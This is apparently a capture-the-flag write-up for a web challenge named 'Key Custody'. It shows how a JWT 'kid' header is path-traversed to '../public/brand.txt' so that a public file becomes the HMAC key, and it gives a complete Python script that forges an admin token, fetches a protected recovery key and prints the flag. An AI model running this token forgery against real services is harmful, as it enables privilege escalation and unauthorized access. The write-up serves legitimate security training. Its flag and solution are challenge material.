# Key Custody

**Category:** Web

## Solution

### 1. Follow the JWT key lookup

I got an analyst JWT from `/token` and checked its header and claims. The server used the header's `kid` value to choose the file containing the HMAC key.

That made the key-loading path the useful input: I could choose a readable file whose contents were already public.

### 2. Point kid at the public asset

I used `../public/brand.txt` as `kid` and downloaded the same file through `/public/brand.txt`. I kept the response as raw bytes; decoding it or stripping a newline would change the HMAC key.

The forged header was:

```json
{"alg": "HS256", "typ": "JWT", "kid": "../public/brand.txt"}
```

I kept the subject as `analyst-recon-17` and changed the role to `admin`.

### 3. Sign the token and request the recovery key

I Base64URL-encoded the header and payload without padding, joined them with a dot, and signed those bytes using HMAC-SHA256 and the unmodified asset bytes.

I used this script, with the challenge base URL in `TARGET_URL`:

```python
import base64
import hashlib
import hmac
import json
import os
from urllib.request import Request, urlopen

BASE = os.environ["TARGET_URL"].rstrip("/")
secret = urlopen(f"{BASE}/public/brand.txt").read()

def b64url(blob):
    return base64.urlsafe_b64encode(blob).rstrip(b"=").decode("ascii")

def encode(part):
    return b64url(json.dumps(part, separators=(",", ":")).encode())

header = {"alg": "HS256", "typ": "JWT", "kid": "../public/brand.txt"}
payload = {"sub": "analyst-recon-17", "role": "admin"}
message = f"{encode(header)}.{encode(payload)}"
signature = b64url(hmac.new(secret, message.encode(), hashlib.sha256).digest())
token = f"{message}.{signature}"
request = Request(
    f"{BASE}/admin/recovery-key",
    headers={"Authorization": f"Bearer {token}"},
)
print(urlopen(request).read().decode())
```

### 4. Read the protected response

I sent the token to `/admin/recovery-key` as a Bearer token. The response was HTTP 200, with the flag in `recovery_key`.

## Flag

```text
CSCTF{3NKP02iqWOzaMj03hbWNlLLx}
```

> **Note:** The briefing named `/admin/flag`; my successful request used `/admin/recovery-key`.
